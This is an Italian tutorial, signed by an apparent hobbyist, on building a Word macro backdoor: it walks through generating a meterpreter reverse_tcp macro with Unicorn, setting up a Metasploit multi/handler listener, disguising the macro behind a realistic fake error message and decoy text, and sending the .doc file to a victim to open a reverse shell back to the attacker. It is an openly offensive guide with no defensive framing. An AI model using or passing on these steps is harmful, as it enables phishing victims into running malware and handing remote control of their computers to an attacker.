	***	MACRO BACKDOOR con Kali Linux	***

Guida per ottere controllo remoto di Windows sfruttando le macro 
che possono essere utilizzate nei documenti MS OFFICE.
Questa tecnica è più articolata rispetto alla creazione della semplice Backdoor con metasploit non 
criptata ma certamente più convincente per la vittima che dovrà aprire un documento Word invece che
un programma ".exe" e servono 3 strumenti:
- Unicorn (reperibile online)
- Metasploit
- MS OFFICE



-- PRIMA PARTE --

Per fare questo attacco dobbiamo procuraci un tool per la nostra
Kali Linux  che si chiama unicorn
[link per download unicorn: https://github.com/trustedsec/unicorn]
e anche Microsoft Office per creare il file con la macro interna!

Nella cartella unicorn c'è il file python quindi basta scaricare tutto 
(nel formato .zip) e richiamare il file.
Se non si scarica il file zippato è possibile clonare il contenuto della pagina
di github tramite il comando su terminale:
"git clone https://github.com/trustedsec/unicorn"
La cartella è contenuta nella home.

Entra nella cartella (se non sei già nella directory home)
Entra nella cartella unicorn (cd unicorn/) dove trovi il file 
"unicorn.py".
Per eseguirlo bisogna richiamare l'interprete:
python unicorn.py e premi [INVIO] e compaiono varie opzioni!
Noi siamo interessati all'attacco "Macro Example", in quanto questa
voce ci permette di creare il file che sarà la macro che devo inserire
nel documento Word.

Ripetere il procedimento però usando la sintassi della voce "Macro Example" --> python unicorn.py windows/meterpreter/reverse_tcp X.X.X.X 443 macro [INVIO]

## ATTENZIONE ##
Il parametro "X.X.X.X" è il tuo indirizzo ip che puoi scoprire tramite il comando "ifconfig" sempre da terminale!

Ora il codice python elabora per qualche istante...e ci restituisce un file
di testo ".txt" che contiene la futura macro di Word.

Ora dobbiamo aprire il file (che è sempre nella cartella unicorn) in quanto 
dobbiamo modificare il contenuto della stringa del MessageBox poichè scritta
in lingua inglese e modificala in lingua Italiana a piacere, cercando di 
rendere il messaggio il più reale possibile.

Variabile  "title" --> contiene il titolo MessageBox
Variabile "msg" --> contiene il contenuto del MessageBox che ci indica l'errore.

Salva il file di testo e avvia metasploit con il comando "msfconsole".
Metasploit ci serve per rimanere in ascolto della vittima che aprirà il documento Word.

use/multi/handler [invio] --> per rimanere in ascolto
set PAYLOAD windows/meterpreter/reverse_tcp [INVIO] --> connessione
set LHOST X.X.X.X (il tuo indirizzo IP che hai usato prima) [INVIO] --> per impostare ip
set LPORT 443 (se prima hai usato sempre questa porta) [INVIO] --> imposti la porta
exploit [INVIO] --> ora inizia a rimanere in ascolto 



-- SECONDA PARTE  --

Dobbiamo andare su Windows e creare un documento Word, nel quale inserire il contenuto 
del documento di testo ottenuto dal tool Unicorn di Kali Linux per creare la macro.

Visualizza,Macro,Dare un nome alla macro,crea
Nella seconda schermata che si apre premere nel menù la voce 
"Microsoft Word Oggetti" la voce "ThisDocument" e incolliamo il contenuto
del file di testo e salva la macro!
Scrivi qualcosa nel documento di testo per renderlo più reale.
Salva il documento Word scegliendo il formato "97-2003" --> ".doc" 

Invia documento alla vittima.



-- TERZA PARTE  --

Ora che hai inviato il documento Word .doc alla tua vittima attendi che apra il documento Word,
e una volta aperto compare il MessageBox (messaggio di errore modificato prima) e preme "OK".
La macro richiama "powershell" (è normale che compaia qualche istante" e si instaura quindi
la connessione inversa dalla macchina Windows verso Kali Linux!




BUON HACKING!
Federico Coppola













